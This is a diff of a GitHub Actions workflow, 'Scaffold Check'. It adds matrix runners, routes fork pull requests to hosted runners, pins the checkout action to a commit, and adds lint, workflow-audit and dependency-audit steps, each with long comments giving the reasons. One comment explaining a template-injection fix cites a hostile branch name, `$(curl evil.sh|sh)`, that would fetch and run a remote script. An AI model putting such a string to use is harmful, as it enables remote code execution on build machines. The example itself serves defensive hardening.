@@ -1,27 +1,592 @@
 name: Scaffold Check
 
 on:
+  # Every pull request, whatever it targets. Filtering to [main, master] meant a
+  # STACKED pr — one based on another feature branch, which is how a large change
+  # gets split into reviewable pieces — ran no checks at all and reported "no checks
+  # reported" rather than a failure. Silent absence of validation is worse than a
+  # visible failure.
   pull_request:
-    branches: [main, master]
   push:
     branches: [main, master]
+  # RE-RUN THE GATE WITHOUT INVENTING A COMMIT. Added after wanting to verify a
+  # SCAFFOLD_RUNNERS change and finding the only way to trigger this workflow was to push
+  # something -- so the choice was a no-op commit in the history of every adopter, or not
+  # verifying. A repository-variable change alters where CI runs and changes no file, and
+  # that is exactly the class of change that most needs a run to confirm it.
+  workflow_dispatch:
 
+concurrency:
+  # CANCEL SUPERSEDED PULL REQUEST RUNS, NEVER SUPERSEDED main RUNS. The asymmetry is the
+  # whole point, so do not "simplify" this to a bare `true`.
+  #
+  # On a PR, only the last push describes the code that would merge; an earlier run is
+  # reporting on a diff that no longer exists. Branches here routinely took 3-7 runs to
+  # settle, and every superseded one was a full billed job answering a stale question.
+  #
+  # On main, each run is the per-commit record of WHICH COMMIT BROKE WHAT. Cancelling those
+  # collapses the record precisely when a burst of commits makes bisecting most valuable —
+  # you would be left knowing the tree went red without knowing where. That is a worse
+  # trade than the minutes are worth, so main keeps every run.
+  #
+  # github.ref separates the two cases on its own (refs/pull/N/merge vs refs/heads/main),
+  # so a PR targeting main never shares a group with a push to main.
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+# LEAST PRIVILEGE, DECLARED IN THE FILE RATHER THAN INHERITED FROM A SETTING.
+#
+# With no `permissions:` block a workflow gets the repository's default GITHUB_TOKEN scope.
+# Robiton/ai-project-scaffold is set to `read`, so nothing here was over-privileged — but
+# THAT IS A REPOSITORY SETTING AND THIS FILE IS A PRODUCT. It is force-installed into every
+# adopter on upgrade, and an adopter whose organisation still defaults to read-write would
+# run it with a token that can push commits, cut releases and edit workflows. The guarantee
+# has to travel with the file, not sit in a checkbox on one repository.
+#
+# Nothing here uses GITHUB_TOKEN at all: the checkout needs read, and the mirror step
+# authenticates with its own deploy key. So read is not a compromise, it is the actual need.
 permissions:
   contents: read
 
 jobs:
   scaffold-check:
-    runs-on: ubuntu-latest
-    timeout-minutes: 1
+    # THE RUNNER IS A REPO DECISION, NOT A FILE EDIT. This file is a PRODUCT_FILE: the
+    # scaffold force-installs it on every upgrade, and it ships to adopters who have no
+    # self-hosted runner. Hardcoding `self-hosted` here would break every one of them and
+    # leave a .scaffold-<version> sidecar to reconcile by hand forever -- which is the exact
+    # mechanism that put three of them in a tracked tree for three days in August.
+    # So the default stays hosted and a single repository variable retargets one repo:
+    #     gh variable set SCAFFOLD_RUNNER --body self-hosted
+    # Unset, `vars.SCAFFOLD_RUNNER` is empty and this resolves to ubuntu-latest.
+    #
+    # ---- ONE VARIABLE MEANT ONE PLATFORM, AND THAT WAS THE BLIND SPOT ----
+    #
+    # SCAFFOLD_RUNNER is a single string, so a repo gets exactly one runner, and every
+    # runner in this fleet is an Apple Silicon Mac. The gate therefore could not fail on a
+    # Linux-only defect, and on 2026-08-31 that stopped being theoretical: of nine issues
+    # filed against the scaffold in one day, FIVE were Linux portability -- `mktemp -t`
+    # (BSD-only), a literal tab in a BRE, git identity auto-derivation -- all found by a
+    # Linux adopter AFTER release, none of them catchable by the green gate that approved
+    # them. The gate was not wrong; it was blind, which is worse, because a blind gate
+    # still reports PASSED.
+    #
+    # SCAFFOLD_RUNNERS is a JSON LIST and fans this job across every entry:
+    #     gh variable set SCAFFOLD_RUNNERS --body '[["self-hosted","macOS"],["self-hosted","Linux"]]'
+    # An entry may be a plain string ("ubuntu-latest") or a label array, because `runs-on`
+    # accepts either.
+    #
+    # THE FALLBACK CHAIN IS THE MIGRATION, and it is not optional: five repositories
+    # already set SCAFFOLD_RUNNER, this file is force-installed into all of them on
+    # upgrade, and a matrix that read only the new variable would move all five onto a
+    # billing-blocked hosted runner the moment they upgraded -- turning a portability fix
+    # into a fleet-wide outage. Precedence: SCAFFOLD_RUNNERS, else SCAFFOLD_RUNNER wrapped
+    # into a one-element list, else hosted. Nobody has to change anything to stay working.
+    #
+    # `fromJSON` on a malformed value fails the run at parse time with a message that does
+    # not name this variable, so if a job dies before any step starts, check the JSON here
+    # first. `tools/ci_status.sh --check` validates it locally against the same rules.
+    #
+    # fail-fast is OFF DELIBERATELY. The entire value of the matrix is learning that a
+    # change passes on one platform and fails on the other; cancelling the survivor the
+    # moment one leg goes red destroys exactly the comparison the matrix exists to make.
+    #
+    # ---- A PULL REQUEST FROM ANOTHER REPOSITORY NEVER REACHES A SELF-HOSTED RUNNER ----
+    #
+    # Audit 2026-10-08. A self-hosted runner is a persistent machine with this account's
+    # files on it, and every step below runs the PR's own tools/. A pull request whose head
+    # is a FORK (or a deleted fork, where head.repo is null) is therefore routed to a
+    # GitHub-hosted, throwaway runner, whatever SCAFFOLD_RUNNER(S) says. Re-routed rather
+    # than skipped: a skipped job reads as success to branch protection, and a fork
+    # contributor still gets a real verdict. scaffold-check-complete uses the same rule,
+    # and tools/workflow_audit.sh fails a runner expression that lacks it.
+    #
+    # THIS IS DEFENCE IN DEPTH, NOT THE CONTROL. On `pull_request` the workflow file comes
+    # from the PR's merge commit, so a hostile fork can delete this line. The control is the
+    # repository's Actions setting for fork pull requests (off, or approval required), and
+    # for a PUBLIC repository GitHub's own advice is no self-hosted runner at all.
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: ${{ fromJSON((github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository) && '["ubuntu-latest"]' || vars.SCAFFOLD_RUNNERS || (vars.SCAFFOLD_RUNNER && format('["{0}"]', vars.SCAFFOLD_RUNNER)) || '["ubuntu-latest"]') }}
+    runs-on: ${{ matrix.runner }}
+    # Each leg sets only its own cov_<job-index>. Eight slots; a fleet with more legs than
+    # that is read through the jobs API instead (audit_coverage.sh --from-outputs exits 3).
+    outputs:
+      cov_0: ${{ steps.cov.outputs.cov_0 }}
+      cov_1: ${{ steps.cov.outputs.cov_1 }}
+      cov_2: ${{ steps.cov.outputs.cov_2 }}
+      cov_3: ${{ steps.cov.outputs.cov_3 }}
+      cov_4: ${{ steps.cov.outputs.cov_4 }}
+      cov_5: ${{ steps.cov.outputs.cov_5 }}
+      cov_6: ${{ steps.cov.outputs.cov_6 }}
+      cov_7: ${{ steps.cov.outputs.cov_7 }}
+    # Raised from 1 when the ruff step landed: `pipx run` resolves and downloads the
+    # pinned wheel on a cold runner, which the previous ceiling did not budget for.
+    #
+    # RAISED TO 8 ON 2026-08-18, AFTER FIXING THE COST RATHER THAN BUDGETING FOR IT.
+    #
+    # #237 de-duplicated adoption_check and said: if it still binds, a raise is a better-
+    # evidenced request. It still bound — but only in an adopter that DECLARES a must-run
+    # gate, and the reason was worth more than the raise. adoption_check runs a full inner
+    # preflight in each of its two fixtures, and that inner preflight was running the
+    # ADOPTER'S OWN SUITE. The same suite then ran a third time as this job's audit step.
+    #
+    #   ai-project-scaffold   no must-run declared    adoption_check  62s
+    #   localcoder            must-run: the audit     adoption_check 131s  -> 66s after
+    #
+    # Fixed in preflight, not here: inside a fixture (SCAFFOLD_ADOPTION_FIXTURE=1) the
+    # adopter's must-run gates are skipped AND NAMED. It is also the right scope — a check
+    # called "does the scaffold work in an adoption" should not fail because the adopter's
+    # product test failed.
+    #
+    # 8 minutes covers the slowest observed shape with headroom: on the self-hosted M3,
+    # roughly 170s of adoption_check plus a ~120s audit step plus ~40s of selftests. It is a
+    # CEILING, NOT A BUDGET — a job approaching it is a bug report, not headroom to grow into.
+    #
+    # SCAFFOLD_CHECK_TIMEOUT (a repository variable, minutes) raises it for a runner whose
+    # contention you cannot fix from the job. Measured: on a shared M3 with ~11 runners and
+    # local models, godsfall timed out from CPU contention, not from a slow job. Set it per
+    # repository, record why, and leave the default here alone. `vars` is one of the contexts
+    # timeout-minutes accepts; fromJSON turns the variable's string into the number it needs.
+    timeout-minutes: ${{ fromJSON(vars.SCAFFOLD_CHECK_TIMEOUT || '8') }}
 
     steps:
-      - uses: actions/checkout@v4
+      # v7, NOT v4. THIS FILE SHIPS TO EVERY ADOPTER, so a deprecated action here is a
+      # warning annotation on every run of every project that took the scaffold:
+      #
+      #   ##[warning]Node.js 20 is deprecated ... actions/checkout@v4 ... forced to run
+      #   on Node.js 24
+      #
+      # It fires forever, it is not actionable by the adopter (they did not choose the
+      # pin, we did), and it sits in exactly the slot a REAL warning would occupy. That
+      # is the A10 failure mode with a different owner — a permanent annotation teaches
+      # people to stop reading annotations, and the next one that matters is filtered out
+      # with it. Reported from the godsfall adoption on 0.36.5, which was otherwise the
+      # first run with zero annotations.
+      #
+      # v5 clears the deprecation (node24); v7 is current. v7's one breaking change is
+      # that it blocks checking out fork PRs under `pull_request_target` and
+      # `workflow_run` — this workflow triggers on `pull_request` and `push` only, so it
+      # does not apply.
+      #
+      # THAT PARAGRAPH USED TO END "floating the major deliberately", and the reasoning for
+      # NOT pinning sat directly above the pin that does. The decision reversed on
+      # 2026-09-22 (owner's call, fleet-wide) and the prose was left behind for one release
+      # -- the exact stale-block-above-live-code shape this file keeps warning about, this
+      # time in my own comment. THE CONCERN IT RAISED IS STILL REAL and is not dismissed:
+      # a SHA does go stale silently in every adopter's copy. It is now an accepted cost
+      # with a stated remedy, rather than an argument against the thing being done below.
+      # PINNED TO A COMMIT, NOT A TAG. `@v7` is a moving reference: whoever controls the
+      # tag controls what runs here, with our credentials, on a SELF-HOSTED runner where
+      # injected code outlives the job. zizmor rates this `unpinned-uses`, High.
+      # THE COST IS THAT IT NO LONGER UPDATES ITSELF. Re-resolve deliberately:
+      #   gh api repos/actions/checkout/git/ref/tags/v7 --jq .object.sha
+      # and keep the trailing `# v7` comment truthful — it is the only human-readable
+      # record of WHICH version this hash is, and a stale one is worse than none.
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          # The build-stamp check compares this branch against its base, so it needs
+          # more than the default single commit. 0 = full history; a shallow clone made
+          # `git diff base...HEAD` fail, and a comparison that cannot run is not a pass.
+          fetch-depth: 0
 
+      - name: Run every tool selftest
+        run: |
+          # DISCOVERED, NOT LISTED. Three tools shipped a --selftest this round and CI ran
+          # two of them; guard_pretooluse.py's 33 cases were never executed by anything,
+          # sitting in the release checklist as a manual step nobody reaches. That is the
+          # exact failure this project keeps finding in itself — a rule with nothing behind
+          # it — reproduced in the checks meant to prevent it.
+          #
+          # So this does not name them. It finds every executable in tools/ that advertises
+          # `--selftest` in its own usage text and runs it, which means the NEXT tool's
+          # suite is picked up without anyone remembering to add a line here.
+          # A SUITE THAT IS SKIPPED LOOKS EXACTLY LIKE A SUITE THAT PASSED, and the only
+          # visible difference is a number nobody compares to anything. Demonstrated on
+          # this very PR: tools/conflict_scan.sh arrived tracked as 644 — its 15 cases,
+          # written that hour to cover a defect that had shipped, did not run, and the step
+          # said "12 tool selftest suite(s) passed" in green. The `[ -x ]` guard below is
+          # correct (a non-executable file cannot be invoked) but silence about it is not.
+          #
+          # So the executable bit is checked BEFORE it is used as a filter. This costs one
+          # grep per file and closes the gap where losing a mode bit quietly retires a test
+          # suite. The file-mode step below fails the build on it; this names the specific
+          # consequence at the point where it bites.
+          # WHERE DISCOVERY LOOKS: tools/, plus any directory the project DECLARES at column 0
+          # in AGENTS.md as holding its own product:
+          #
+          #     <!-- scaffold:product-dir src/localcoder -->
+          #
+          # Robiton/localcoder ships its product at src/localcoder/ and tools/ there is the
+          # vendored governance layer, so scanning tools/ alone left that repo's own shipped
+          # executables as the one thing CI never selftested. It had been fixing that by
+          # EDITING this file, which made scaffold-check.yml a divergent PRODUCT file: every
+          # upgrade left a .scaffold-<version> sidecar, and on 2026-08-12 three were found
+          # tracked and unreconciled since 2026-08-09 — one of them this workflow.
+          #
+          # THIS BLOCK AND scan_dirs() IN tools/preflight.sh ARE TWO COPIES OF ONE RULE, which
+          # is this project's most repeated defect. They are pinned against each other by
+          # `tools/preflight.sh --selftest`; do not edit one without the other.
+          #
+          # A DECLARED DIRECTORY THAT DOES NOT EXIST IS AN ERROR, not a skip — otherwise a
+          # renamed product directory retires a whole suite and discovery just gets quieter.
+          SCAN_DIRS="tools"
+          for d in $(grep -oE '^<!--[[:space:]]*scaffold:product-dir[[:space:]]+[^[:space:]]+' AGENTS.md 2>/dev/null | awk '{print $NF}'); do
+            if [ -d "$d" ]; then
+              SCAN_DIRS="$SCAN_DIRS $d"
+            else
+              # scaffold:also-local tools/preflight.sh — "a declared product directory does not exist"
+              echo "::error::AGENTS.md declares scaffold:product-dir $d, which does not exist."
+              exit 1
+            fi
+          done
+          echo "selftest discovery scans: $SCAN_DIRS"
+
+          skipped=0
+          for d in $SCAN_DIRS; do
+          for f in "$d"/*; do
+            case "$f" in *.md|*.template) continue ;; esac
+            [ -f "$f" ] || continue
+            grep -q -- '--selftest' "$f" || continue
+            if [ ! -x "$f" ]; then
+              # scaffold:also-local tools/mode_scan.sh — reads the mode git RECORDS, which is the one that matters (core.fileMode=false hides it on disk)
+              echo "::error::$f advertises --selftest but is not executable — its suite DID NOT RUN."
+              skipped=$((skipped + 1))
+            fi
+          done
+          done
+          [ "$skipped" -eq 0 ] || exit 1
+
+          # RUNS AS ITS OWN STEP, SO DISCOVERY MUST NOT RUN IT AGAIN (#237). In
+          # tools/adoption_check.sh, `--selftest` and bare are the SAME function --
+          # `case "${1:-}" in --selftest) selftest_both ;; "") selftest_both ;;` -- so the
+          # explicit "synthetic ADOPTION" step below and this sweep were running one
+          # identical 160s twice per job. On godsfall that is 162s + 161s against this
+          # job's own ceiling (5 minutes at the time): the job was cancelled every push, and the
+          # eleven steps after it -- header checks, required files, the scanners, the
+          # localcoder audit -- never ran at all. The budget was spent running one tool
+          # twice.
+          #
+          # SKIPPING IT HERE IS THE INVERSE OF THE DEFECT THIS DISCOVERY EXISTS TO CATCH.
+          # That defect is a suite nobody runs; this is a suite that runs twice. The
+          # difference is real but it is not visible in a log, so the skip is NAMED rather
+          # than silently filtered -- and, more importantly, it is CHECKED: delete the
+          # explicit step below and this line quietly retires the suite in CI, which would
+          # be the original defect reintroduced one level up by its own exception.
+          # `tools/preflight.sh --selftest` asserts that every basename here is invoked by
+          # an explicit step in this file. An exception that is trusted rather than checked
+          # is how this repo keeps getting bitten; this one is checked.
+          SELFTEST_SKIP="adoption_check.sh"
+
+          found=0
+          for d in $SCAN_DIRS; do
+          for f in "$d"/*; do
+            [ -x "$f" ] || continue
+            case " $SELFTEST_SKIP " in
+              *" $(basename "$f") "*)
+                echo "── skip $f (runs as its own step below)"
+                continue ;;
+            esac
+            # A DIRECTORY IS EXECUTABLE. `[ -x ]` alone passes src/localcoder/__pycache__,
+            # and `grep` then writes "Is a directory" to stderr on every CI run. Invisible
+            # while discovery only ever walked tools/, which has no subdirectories — the
+            # first product-dir run surfaced it immediately. The skipped-suite loop above
+            # already had this test; this one did not.
+            [ -f "$f" ] || continue
+            case "$f" in *.md|*.template) continue ;; esac
+            grep -q -- '--selftest' "$f" || continue
+            echo "── $f --selftest"
+            "$f" --selftest || exit 1
+            found=$((found + 1))
+          done
+          done
+          echo "$found tool selftest suite(s) passed"
+          # A selftest runs on the platform you are already on, so it cannot catch a
+          # portability defect. This job being ubuntu is the only Linux exposure the repo
+          # has — it is what caught `mktemp -t NAME` (BSD-only), which meant
+          # scaffold_upgrade.sh had never run on Linux at all while its own 23 checks
+          # passed on macOS.
+          if [ "$found" -eq 0 ]; then
+            echo "::warning::no tool selftests were found — that is almost certainly wrong."
+          fi
+
+      - name: Lint this scaffold's own Python
+        run: |
+          # THE RULE MOVED INTO A FILE (#166). This step was ~40 lines of shell in a `run:`
+          # block, which meant it could only ever run in CI: an adopter who wanted to know
+          # whether their push would be linted had to read YAML and retype the command, PIN
+          # INCLUDED — and the pin is the load-bearing part, since this repo's tools produce
+          # 8 findings under the declared set and 66 under ruff's current defaults. Two people
+          # doing that get two answers, and the local one is the reassuring one.
+          #
+          # tools/lint_python.sh now holds the pin, the rule set, the ownership scoping and
+          # the reasoning for all three, and it carries a --selftest that the discovery step
+          # above runs. `tools/preflight.sh` calls the same file, so local and CI cannot
+          # disagree. Exit 2 means "could not run" and is distinct from 1, "found something".
+          if [ -x tools/lint_python.sh ]; then
+            tools/lint_python.sh
+          else
+            # scaffold:also-local tools/preflight.sh — gates on lint_python.sh and reports a GAP when absent
+            echo "::error::tools/lint_python.sh missing — this repo's own Python is unlinted."
+            exit 1
+          fi
+
+      - name: Lint this scaffold's own shell
+        run: |
+          # SHELL IS WHAT THIS REPOSITORY IS MOSTLY WRITTEN IN, and until 0.110.0 no step
+          # here linted a line of it. The sole mention of shellcheck in the whole tree was
+          # a `# shellcheck disable=SC2086` directive, which is a suppression for a tool
+          # that never ran.
+          #
+          # WHERE THE BINARY ACTUALLY IS, measured 2026-09-22 rather than reported: present
+          # on the macOS self-hosted runner and on the M5, ABSENT on the Linux self-hosted
+          # runner. The first version of this step said it was installed "on every
+          # self-hosted runner" -- that came from a peer session's report, I never checked
+          # it, and CI disproved it on the first run. The GAP branch below is therefore not
+          # hypothetical; it is the Linux runner's actual state today.
+          #
+          # The pin and the severity floor live in the FILE, not in this block, for the
+          # reason the Python step above records: a rule that only exists in YAML can only
+          # ever run in CI, and an adopter who wants the same answer has to retype it,
+          # pin included. `tools/preflight.sh` calls the identical file.
+          #
+          # EXIT 3 IS NOT A PASS AND NOT A FAILURE. It means no shellcheck at the pin was
+          # found, so nothing was examined. That is a WARNING here rather than an error:
+          # a toolchain that has gone missing from a runner is a provisioning problem, and
+          # failing every build over it trains people to ignore the step. It must never be
+          # silent, which is what an unguarded `|| true` would make it.
+          if [ -x tools/shell_lint.sh ]; then
+            # `|| rc=$?`, NOT `; rc=$?`. GitHub runs this block as `bash -e`, so a simple
+            # command that returns non-zero kills the shell THERE -- `rc=$?` never executes
+            # and every line of the exit-3 handling below is dead code. Measured 2026-09-22:
+            # this step went red on the Linux runner with "Process completed with exit code
+            # 3" while the macOS runner passed, because macOS HAS the binary and so never
+            # took the failing path. A three-outcome gate whose third outcome is unreachable
+            # is a two-outcome gate, and it took a heterogeneous fleet to show it.
+            rc=0
+            tools/shell_lint.sh --check || rc=$?
+            # PUBLISH WHAT THIS LEG ACTUALLY DID. A leg knows only its own result; whether
+            # the FLEET audited anything is a fact no leg can see. The aggregating job
+            # decides that, and it can only decide it from what the legs publish here.
+            if [ "$rc" = "3" ]; then
+              echo "COV_SHELL_LINT=gap" >> "$GITHUB_ENV"
+              echo "::warning::shell lint DID NOT RUN (exit 3) — no shellcheck at the pin on this runner. Nothing was examined; this is not a clean lint."
+            else
+              # Recorded as `ran` for a real FAILURE too: exit 1 means shellcheck examined
+              # the tree and found something. That is coverage. Only exit 3 is an absence.
+              echo "COV_SHELL_LINT=ran" >> "$GITHUB_ENV"
+              [ "$rc" = "0" ] || exit "$rc"
+            fi
+          else
+            # scaffold:also-local tools/preflight.sh — gates on shell_lint.sh and reports a GAP when absent
+            echo "::error::tools/shell_lint.sh missing — this repo's own shell is unlinted."
+            exit 1
+          fi
+
+      - name: Audit the workflows themselves
+        run: |
+          # THE WORKFLOWS ARE CODE, AND THEY SHIP TO EVERY ADOPTER. On 2026-09-21 zizmor
+          # found a live template injection in this very file — `github.base_ref`, which is
+          # an attacker-controllable branch name, interpolated straight into a `run:` block
+          # — and because this file is vendored, the same line was live in four
+          # repositories at once. It was found by a person running zizmor BY HAND, once.
+          # Nothing ran it on any schedule, and the sweep the following day still missed a
+          # repository that was carrying it. This step is that sweep, made routine.
+          #
+          # --persona=auditor AND --min-severity high LIVE IN THE FILE. Both are
+          # load-bearing and neither is obvious: zizmor's DEFAULT persona suppressed 7 of
+          # the 11 findings on this tree, so a plain `zizmor .github/workflows` would audit
+          # a third of what its output implies. tools/workflow_audit.sh records the
+          # measurements behind both choices, and inverts zizmor's exit codes — zizmor
+          # returns 1 for COULD NOT RUN and 14 for findings, so a pass-through wrapper
+          # reports "findings" when it audited nothing and wrote an empty stdout.
+          if [ -x tools/workflow_audit.sh ]; then
+            # `|| rc=$?`, NOT `; rc=$?`. GitHub runs this block as `bash -e`, so a simple
+            # command that returns non-zero kills the shell THERE -- `rc=$?` never executes
+            # and every line of the exit-3 handling below is dead code. Measured 2026-09-22:
+            # this step went red on the Linux runner with "Process completed with exit code
+            # 3" while the macOS runner passed, because macOS HAS the binary and so never
+            # took the failing path. A three-outcome gate whose third outcome is unreachable
+            # is a two-outcome gate, and it took a heterogeneous fleet to show it.
+            rc=0
+            tools/workflow_audit.sh --check || rc=$?
+            if [ "$rc" = "3" ]; then
+              echo "COV_WORKFLOW_AUDIT=gap" >> "$GITHUB_ENV"
+              echo "::warning::workflow audit DID NOT FULLY RUN (exit 3) — zizmor or actionlint is not at the pin on this runner. The log above says which half ran; this is not a clean result."
+            else
+              echo "COV_WORKFLOW_AUDIT=ran" >> "$GITHUB_ENV"
+              [ "$rc" = "0" ] || exit "$rc"
+            fi
+          else
+            # scaffold:also-local tools/preflight.sh — gates on workflow_audit.sh and reports a GAP when absent
+            echo "::error::tools/workflow_audit.sh missing — the workflows were not audited."
+            exit 1
+          fi
+
+      - name: Audit declared dependencies
+        run: |
+          # THIS GATE RAN ONLY IN LOCAL PREFLIGHT UNTIL 0.111.5. Robiton COLLECTO's PR #91 went
+          # green here while local preflight reported uuid 7.0.3 (GHSA-w5hq-g745-h8pq), and
+          # `preflight --coverage` could not see it: it checked that local covers CI, never
+          # that CI covers local.
+          #
+          # FINDINGS ARE ADVISORY HERE, AS THEY ARE IN PREFLIGHT, AND STRICT AT RELEASE. A CVE
+          # published overnight should not turn a push red over a comment edit; it must stop a
+          # release. So a finding is a ::warning:: carrying the advisories, not a red step.
+          #
+          # FOUR OUTCOMES, NOT THREE. rc 3 means both "nothing is declared" and "declared, but
+          # no osv-scanner here". --declared splits them. Only the second is a GAP; the first
+          # is N/A, and the aggregating job must not fail a repo for having no dependencies.
+          if [ -x tools/dependency_audit.sh ]; then
+            if ! tools/dependency_audit.sh --declared; then
+              echo "COV_DEPENDENCY_AUDIT=na" >> "$GITHUB_ENV"
+              echo "dependency audit: nothing declared to audit — not a pass, nothing was checked"
+              exit 0
+            fi
+            # `|| rc=$?`, NOT `; rc=$?`: this block runs as `bash -e` (see the shell lint step).
+            rc=0
+            out="$(tools/dependency_audit.sh --strict 2>&1)" || rc=$?
+            printf '%s\n' "$out"
+            case "$rc" in
+              0) echo "COV_DEPENDENCY_AUDIT=ran" >> "$GITHUB_ENV" ;;
+              1) echo "COV_DEPENDENCY_AUDIT=ran" >> "$GITHUB_ENV"
+                 echo "::warning::known vulnerabilities in declared dependencies (advisory here, strict at release) — see this step's log." ;;
+              3) echo "COV_DEPENDENCY_AUDIT=gap" >> "$GITHUB_ENV"
+                 echo "::warning::dependency audit DID NOT RUN (exit 3) — dependencies are declared but were not scanned on this runner. This is not a clean result." ;;
+              *)
+                 # scaffold:also-local tools/preflight.sh — gates on dependency_audit.sh and reports a GAP on an unknown exit
+                 echo "::error::tools/dependency_audit.sh exited $rc — neither a result nor a skip."
+                 exit 1 ;;
+            esac
+          else
+            # scaffold:also-local tools/preflight.sh — gates on dependency_audit.sh and skips it when absent
+            echo "::error::tools/dependency_audit.sh missing — declared dependencies were not audited."
+            exit 1
+          fi
+
+      # THE CHANNEL IS A STEP CONCLUSION, NOT AN ARTIFACT. The first version of this
+      # published each leg's coverage with actions/upload-artifact and failed on BOTH legs
+      # with "Artifact storage quota has been hit" -- while this repository stored ZERO
+      # artifacts, because the quota is ACCOUNT-wide. A cross-leg channel that depends on a
+      # storage quota is a channel that disappears without warning, so this uses none.
+      #
+      # A step that is SKIPPED when the gate gapped and SUCCEEDS when it ran encodes the one
+      # bit the aggregator needs, and `/actions/runs/{id}/jobs` reports step conclusions for
+      # every leg. Note that the GATE step's own conclusion cannot carry this: exit 3 is a
+      # ::warning::, and a warning is still a successful step -- measured on this very run,
+      # where the Linux leg gapped the workflow audit and still reported `success`.
+      - name: 'coverage:shell_lint=ran'
+        if: always() && env.COV_SHELL_LINT == 'ran'
+        run: 'echo "shell_lint produced a verdict on this leg"'
+
+      - name: 'coverage:workflow_audit=ran'
+        if: always() && env.COV_WORKFLOW_AUDIT == 'ran'
+        run: 'echo "workflow_audit produced a verdict on this leg"'
+
+      - name: 'coverage:dependency_audit=ran'
+        if: always() && env.COV_DEPENDENCY_AUDIT == 'ran'
+        run: 'echo "dependency_audit produced a verdict on this leg"'
+
+      # N/A IS ITS OWN MARKER. When this tree declares nothing, the =ran marker above is
+      # skipped, which alone would read as a gap on every leg and fail the run for having no
+      # dependencies. This one tells the aggregating job the leg answered "nothing to examine".
+      - name: 'coverage:dependency_audit=na'
+        if: always() && env.COV_DEPENDENCY_AUDIT == 'na'
+        run: 'echo "dependency_audit: nothing declared to examine on this leg"'
+
+      # THE SAME BITS AS A JOB OUTPUT, AND THIS IS WHAT THE AGGREGATING JOB READS FIRST. The
+      # marker steps above reach it only through the jobs API, which on 2026-09-30 published
+      # green legs' steps more than 100s late on both platforms, and after "Re-run failed
+      # jobs" did not list the legs at all. An output is handed over by the runner itself.
+      # One name per leg (cov_<job-index>), because a matrix merges distinct output names.
+      - name: Publish this leg's coverage
+        id: cov
+        if: always()
+        env:
+          LEG: ${{ strategy.job-index }}
+        run: |
+          echo "cov_${LEG}=shell_lint=${COV_SHELL_LINT:-gap},workflow_audit=${COV_WORKFLOW_AUDIT:-gap},dependency_audit=${COV_DEPENDENCY_AUDIT:-gap}" >> "$GITHUB_OUTPUT"
+
+      - name: Run this scaffold's gates inside a synthetic ADOPTION
+        run: |
+          # THE GAP THAT PRODUCED FOUR DEFECTS IN ONE EVENING. Every step above runs against
+          # THIS repository, which carries overlays/, OVERVIEW.md and resolvable tags — so
+          # any rule that is true of the scaffold and false of an adoption ships green.
+          # On 2026-08-11 that single gap gave us W-05 resolving a scaffold tag against the
+          # adopter's repo, the no-execution rule firing on adopters USING localcoder, the
+          # context budget demanding they delete working policy, and a vacuous overlay pass
+          # reported to us AS A PASS. All four found by one person upgrading a real project.
+          #
+          # The previous step here checked "the two localcoder copies have not drifted" and
+          # was DEAD: localcoder_sync.py was retired in W-15, so it took the else branch on
+          # every run and warned that copies were unwatched when there is only one copy.
+          tools/adoption_check.sh
+
+      - name: Check file headers and build stamps
+        # BASE_REF ARRIVES AS AN ENVIRONMENT VARIABLE, NOT AS `${{ }}` INSIDE run:.
+        # A `${{ }}` expansion is pasted into the script as TEXT before any shell sees
+        # it, so a branch named `$(curl evil.sh|sh)` becomes code rather than a string.
+        # github.base_ref is a branch name on a pull_request, and a branch name is
+        # attacker-controllable. Bound through env: the value reaches the shell as data
+        # and the quotes around "$BASE_REF" do the rest. Found by zizmor
+        # (template-injection, High) 2026-09-21; this file ships to every adopter, so the
+        # same line was live in localcoder, control and collectionapp too.
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          # ai/CODING.md calls a file header MANDATORY and ai/STANDARDS.md requires a
+          # build stamp on every PR. Nothing checked either until 2026-08-04, and the
+          # scaffold's own tools had drifted the furthest: setup.sh's header was 4
+          # versions and ~4 weeks behind its own last change, session_archive.py had no
+          # Version line, sync-check.sh had no header at all. Same shape as the archive
+          # ceiling that reached 1,001 lines — stated, agreed with, never watched.
+          #
+          # Header completeness is a HARD FAILURE: it is deterministic, and a file with
+          # no header is not a judgement call.
+          #
+          # BLOCKING as of 2026-08-05. It shipped as a warning so a fresh adopter's first
+          # PR would not be stopped by a header rule they had not read yet — but a warning
+          # is exactly what went unheeded while setup.sh drifted four versions behind its
+          # own last change, and while SESSION.md reached 1,001 lines against a stated 150.
+          # A warning nobody acts on is indistinguishable from no check.
+          #
+          # `Modified:` is how a reader decides whether the measurement quoted in a comment
+          # still describes the code, and this repo's comments are mostly measurements.
+          #
+          # ADOPTING INTO EXISTING CODE? DO NOT EDIT THIS FILE — DECLARE A BASELINE.
+          # Making this blocking failed one real adoption's entire codebase at once (#76):
+          # 33 files written long before the standard was, and the PR could not merge. The
+          # two hatches available then — EXCLUDE in the checker, --warn-only wired in here —
+          # both live in files `scaffold_upgrade.sh` REPLACES, so either accommodation was
+          # erased by the next upgrade. Run instead:
+          #
+          #     tools/header_check.sh --adopt
+          #
+          # which records your adoption date in ai/STANDARDS.md, a file upgrades merge. Files
+          # older than it are exempt until edited. See ai/STANDARDS.md -> File-header baseline.
+          if [ ! -x tools/header_check.sh ]; then
+            echo "::warning::tools/header_check.sh missing — headers are unenforced."
+            exit 0
+          fi
+          tools/header_check.sh
+          if [ -n "$BASE_REF" ]; then
+            git fetch --quiet origin "$BASE_REF" || true
+            tools/header_check.sh --since "origin/$BASE_REF"
+          fi
+
+      # The file-mode rule moved to tools/mode_scan.sh (#166). It was ~45 lines of inline
+      # shell here, which meant it could only ever run in CI — and it had caught the SAME
+      # mistake three times, remotely, each time on a tool that had just been added: a
+      # shebang recorded at 644 stops being run by every `[ -x ]` loop, and a suite that
+      # did not run looks exactly like a suite that passed. As tools/*_scan.sh it is
+      # discovered by the "Run every tree scanner" step below, by `setup.sh --check` and by
+      # `tools/preflight.sh`, with no edit to any of them, and it carries its own selftest.
       - name: Check required ai/ files exist
         run: |
           MISSING=0
           for f in ai/STANDARDS.md ai/CODING.md ai/SECURITY.md ai/PLANNING.md ai/BACKLOG.md ai/SESSION.md ai/MEMORY.md ai/TEAM.md; do
             if [ ! -f "$f" ]; then
+              # scaffold:also-local setup.sh --check — iterates the same required ai/ file list
               echo "::error::Missing required file: $f"
               MISSING=1
             fi
